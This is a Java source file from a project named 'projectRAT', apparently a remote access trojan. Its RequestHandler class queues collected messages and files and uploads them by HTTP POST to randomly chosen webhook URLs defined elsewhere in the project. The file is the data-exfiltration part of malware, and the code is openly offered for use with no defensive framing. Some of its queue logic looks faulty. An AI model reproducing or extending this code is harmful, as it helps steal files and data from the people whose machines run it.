package in.momin5.projectRAT;

import in.momin5.projectRAT.request.Request;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.ContentType;
import org.apache.http.entity.StringEntity;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.json.simple.JSONObject;

import java.io.File;
import java.util.ArrayDeque;
import java.util.Queue;
import java.util.Random;

public class RequestHandler {

    private final Queue<Request> queue = new ArrayDeque<>();
    private final Queue<Object> stringQueue = new ArrayDeque<>();

    public RequestHandler()  {
        String[] w = ProjectRAT.webhook;

        try {
            new Thread(() -> {
                for (Request item : queue) {
                    try {
                        int randomInt = new Random().nextInt(w.length);
                        if (queue.isEmpty())
                            continue;

                        Thread.sleep(2000);
                        //Request item = (Request) queue.poll();

                        CloseableHttpClient client = HttpClientBuilder.create().build();
                        // TODO: @Momin maybe embeds?
                        if (item.getMessage() != null) {
                            HttpPost request = new HttpPost(w[randomInt]);
                            JSONObject json = new JSONObject();
                            json.put("title", item.getClass().getSimpleName());
                            json.put("content", String.format("```%s```", item.getMessage()));
                            StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
                            request.setEntity(options);
                            HttpResponse response = client.execute(request);
                            //System.out.println(response);
                        }

                        if (item.getFiles() != null) {
                            for (File file : item.getFiles()) {
                                HttpPost request = new HttpPost(w[randomInt]);

                                MultipartEntityBuilder multipartEntityBuilder = MultipartEntityBuilder
                                        .create()
                                        .addPart("_mom_i5n_", new FileBody(file));

                                request.setEntity(multipartEntityBuilder.build());
                                HttpResponse response = client.execute(request);
                                //System.out.println(response);
                            }
                        }
                        client.close();

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }).start();

        new Thread(() -> {
            for (Object queueItem: stringQueue){
                try {
                    int randomInt = new Random().nextInt(w.length);
                    //Object queueItem = stringQueue.poll();
                    Thread.sleep(2000);
                    CloseableHttpClient client = HttpClientBuilder.create().build();
                    if (queueItem instanceof String) {
                        HttpPost request = new HttpPost(w[randomInt]);
                        JSONObject json = new JSONObject();

                        json.put("title", queueItem.getClass().getSimpleName());
                        json.put("content", String.format("```%s```", queueItem));
                        StringEntity options = new StringEntity(json.toJSONString(), ContentType.APPLICATION_JSON);
                        request.setEntity(options);
                        HttpResponse response = client.execute(request);
                        System.out.println(response);
                    }
                    client.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();

    }catch (Exception e){}
    }

    public void sendRequest(Request request) {
        new RequestHandler().queue.add(request);
    }

    public void addStrings(String in){
        new RequestHandler().stringQueue.add(in);
    }

}
